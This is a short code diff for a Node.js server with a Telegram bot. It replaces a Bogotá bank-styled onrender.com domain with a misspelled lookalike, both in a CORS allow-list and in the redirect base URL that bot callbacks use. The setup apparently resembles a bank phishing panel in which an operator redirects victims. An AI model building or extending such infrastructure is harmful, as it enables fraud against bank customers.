@@ -33,7 +33,7 @@ app.use((req, res, next) => {
     
     // Permitir varios orígenes
     const allowedOrigins = [
-        'https://banca-virtual-bogota.onrender.com',
+        'https://sucusalbogotapersona.onrender.com',
         'http://localhost:3000',
         'http://127.0.0.1:3000'
     ];
@@ -158,7 +158,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
         let redirectUrl, message;
         const baseUrl = process.env.NODE_ENV === 'production' 
-            ? 'https://banca-virtual-bogota.onrender.com'
+            ? 'https://sucusalbogotapersona.onrender.com'
             : 'http://localhost:3000';
         
         switch(action) {
